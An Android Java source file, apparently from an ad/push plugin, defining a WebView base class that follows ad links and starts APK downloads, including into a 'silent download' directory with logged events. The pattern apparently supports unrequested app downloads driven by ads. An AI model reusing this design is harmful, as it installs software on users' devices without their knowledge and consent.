package com.tiho.dlplugin.display.ad.view;

import android.content.Context;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import com.tiho.base.base.http.HttpDownload;
import com.tiho.base.common.LogManager;
import com.tiho.dlplugin.display.ad.processer.UrlProcessorFactory;
import com.tiho.dlplugin.log.LogUploadManager;
import com.tiho.dlplugin.util.FileUtil;
import com.tiho.dlplugin.util.PushDirectoryUtil;
import com.tiho.dlplugin.util.TimeUtil;

public abstract class AdWebBase extends WebView {

	public interface BeginDownload {
		public void callbackBegin();
	}

	protected Context context;
	protected long id;
	protected int from;
	private BeginDownload bd;
	protected String downloadUrl;
	protected String userAgent;
	protected long contentLength;
	protected HttpDownload adDownload;
	protected String saveDir;

	protected AdWebBase(Context context, long id, int from) {
		super(context);
		this.context = context;
		this.id = id;
		this.from = from;
		initData();
	}

	protected abstract void download();

	private void initData() {
		getSettings().setJavaScriptEnabled(true);
		setWebViewClient(new WebViewClient() {
			@Override
			public boolean shouldOverrideUrlLoading(WebView view, String url) {
				view.loadUrl(url);
				LogManager.LogShow("广告跳转链接 url=" + url);
				return false;
			}
		});
	}

	public void DownloadStart(String url, String userAgent, String contentDisposition, String mimetype, long contentLength) {
		LogManager.LogShow("广告链接 开始下载 url =" + url);
		if (bd != null) {
			bd.callbackBegin();
		}
		//Todo 耗时操作放子线程
		if (!FileUtil.hasEnoughSpaceSize(context)) {
			FileUtil.deleteInstalledApk(context);
			if (!FileUtil.hasEnoughSpaceSize(context)) {
				// //日志///////

				if (from == UrlProcessorFactory.FROM_OLD_LINK)
					LogUploadManager.getInstance(context).addDownloadLog(id, 2, downloadUrl, TimeUtil.getNowTime(), TimeUtil.getNowTime(), 0, 0, 0, "DOWNLOAD_FAILED_NO_ENOUGH_SPACE", 2, "Y");
				else
					LogUploadManager.getInstance(context).addSilentDownloadLog(3, downloadUrl, TimeUtil.getNowTime(), TimeUtil.getNowTime(), 0, 0, 0, "DOWNLOAD_FAILED_NO_ENOUGH_SPACE", 2, "Y");

				LogManager.LogShow("downloadapk apk no enough Space:" + downloadUrl);
				return;
			}
		}
		
		if (from == UrlProcessorFactory.FROM_OLD_LINK)
			saveDir = PushDirectoryUtil.getDir(context, PushDirectoryUtil.DOWNLOAD_DIR).getAbsolutePath();
		else
			saveDir = PushDirectoryUtil.getDir(context, PushDirectoryUtil.SILENT_DOWNLOAD_DIR).getAbsolutePath();
		
		downloadUrl = url;
		this.contentLength = contentLength;
		this.userAgent = userAgent;
		try {

			LogUploadManager.getInstance(context).addSilentDownloadLog(3, url, TimeUtil.getNowTime(), TimeUtil.getNowTime(), 0, 0, 3, "DOWNLOAD_START", 2, "Y");

			download();
		} catch (Exception e) {
			e.printStackTrace();
			LogManager.LogShow(e);
		}
	}

	public void setBeginDownload(BeginDownload beginDownload) {
		this.bd = beginDownload;
	}

}
